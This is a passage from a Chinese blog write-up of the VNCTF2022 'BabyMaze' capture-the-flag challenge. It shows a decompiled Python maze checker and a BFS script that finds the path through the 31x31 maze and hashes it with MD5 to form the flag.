class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maze</span>():</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    step = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(step)):</span><br><span class="line">        <span class="keyword">if</span> step[i] == <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            x -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> step[i] == <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                x += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> step[i] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                    y -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> step[i] == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                        y += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> _<span class="built_in">map</span>[x][y] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">29</span> <span class="keyword">and</span> y == <span class="number">29</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Welcome To VNCTF2022!!!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;you are still doing the mission alone, this tape will self-destruct in five seconds.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> maze():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congratulation! flag: VNCTF&#123;md5(your input)&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sorry, we won&#x27;t acknowledge the existence of your squad.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># okay decompiling BabyMaze.pyc</span></span><br></pre></td></tr></table></figure><p>发现是31 * 31的迷宫</p><p>稍作整理，DFS解密即可, 解密脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 题目：给定大小为n*m的矩阵，求S到G的最短路径并输出</span></span><br><span class="line"><span class="comment"># 输入：</span></span><br><span class="line"><span class="comment"># 10 10</span></span><br><span class="line"><span class="comment"># #S######.#</span></span><br><span class="line"><span class="comment"># ......#..#</span></span><br><span class="line"><span class="comment"># .#.##.##.#</span></span><br><span class="line"><span class="comment"># .#........</span></span><br><span class="line"><span class="comment"># ##.##.####</span></span><br><span class="line"><span class="comment"># ....#....#</span></span><br><span class="line"><span class="comment"># .#######.#</span></span><br><span class="line"><span class="comment"># ....#.....</span></span><br><span class="line"><span class="comment"># .####.###.</span></span><br><span class="line"><span class="comment"># ....#...G#</span></span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># 迷宫路径</span></span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">MAX_VALUE = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x=<span class="number">0</span>, y=<span class="number">0</span></span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bfs</span>(<span class="params">maze, begin, end</span>):</span></span><br><span class="line">    path = []  <span class="comment"># 保存经过的每一个点</span></span><br><span class="line">    n, m = <span class="built_in">len</span>(maze), <span class="built_in">len</span>(maze[<span class="number">0</span>])</span><br><span class="line">    dist = [[MAX_VALUE <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    pre = [[<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 当前点的上一个点,用于输出路径轨迹</span></span><br><span class="line"></span><br><span class="line">    nx = [[<span class="number">1</span>, <span class="number">0</span>], [-<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">    sx, sy = begin.x, begin.y</span><br><span class="line">    gx, gy = end.x, end.y</span><br><span class="line"></span><br><span class="line">    dist[sx][sy] = <span class="number">0</span></span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    q.put(begin)</span><br><span class="line">    <span class="keyword">while</span> q:</span><br><span class="line">        point = q.get()</span><br><span class="line">        <span class="keyword">if</span> point.x == gx <span class="keyword">and</span> point.y == gy:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            dx, dy = point.x + nx[i][<span class="number">0</span>], point.y + nx[i][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= dx &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt;= dy &lt; m <span class="keyword">and</span> maze[dx][dy] != <span class="string">&#x27;#&#x27;</span> <span class="keyword">and</span> dist[dx][dy] == MAX_VALUE:</span><br><span class="line">                dist[dx][dy] = dist[point.x][point.y] + <span class="number">1</span></span><br><span class="line">                pre[dx][dy] = point</span><br><span class="line">                q.put(Point(dx, dy))</span><br><span class="line">    stack = []</span><br><span class="line">    curr = end</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        stack.append(curr)</span><br><span class="line">        <span class="keyword">if</span> curr.x == begin.x <span class="keyword">and</span> curr.y == begin.y:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        prev = pre[curr.x][curr.y]</span><br><span class="line">        curr = prev</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        curr = stack.pop()</span><br><span class="line">        <span class="comment"># print(&#x27;(%d, %d)&#x27; % (curr.x, curr.y))</span></span><br><span class="line">        path.append((curr.x, curr.y))</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="comment"># 将路径的点打印为路径</span></span><br><span class="line">    sss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(path)):</span><br><span class="line">        x = path[i-<span class="number">1</span>]   <span class="comment"># 前面的</span></span><br><span class="line">        y = path[i]     <span class="comment"># 后面的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x[<span class="number">0</span>] == y[<span class="number">0</span>]:    <span class="comment"># 横坐标相同，左右移动，即a或d</span></span><br><span class="line">            <span class="keyword">if</span> x[<span class="number">1</span>] &gt; y[<span class="number">1</span>]:</span><br><span class="line">                sss += <span class="string">&quot;a&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sss += <span class="string">&quot;d&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 纵坐标相同</span></span><br><span class="line">            <span class="keyword">if</span> x[<span class="number">0</span>] &gt; y[<span class="number">0</span>]:</span><br><span class="line">                sss += <span class="string">&quot;w&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sss += <span class="string">&quot;s&quot;</span></span><br><span class="line">    <span class="comment"># print(sss)</span></span><br><span class="line">    <span class="keyword">return</span> sss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n, m = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    maze = [[<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    begin = Point()</span><br><span class="line">    end = Point()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        s = <span class="built_in">input</span>()</span><br><span class="line">        maze[i] = <span class="built_in">list</span>(s)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;S&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">            begin.x = i</span><br><span class="line">            begin.y = s.index(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;G&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">            end.x = i</span><br><span class="line">            end.y = s.index(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">    _path = bfs(maze, begin, end)</span><br><span class="line">    path = get_path(_path)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="built_in">print</span>(hashlib.md5(path.encode()).hexdigest())</span><br><span class="line"><span class="comment"># 31 31</span></span><br><span class="line"><span class="comment"># ###############################</span></span><br><span class="line"><span class="comment"># #S#.................#.........#</span></span><br><span class="line"><span class="comment"># #.#.#########.#####.#.#######.#</span></span><br><span 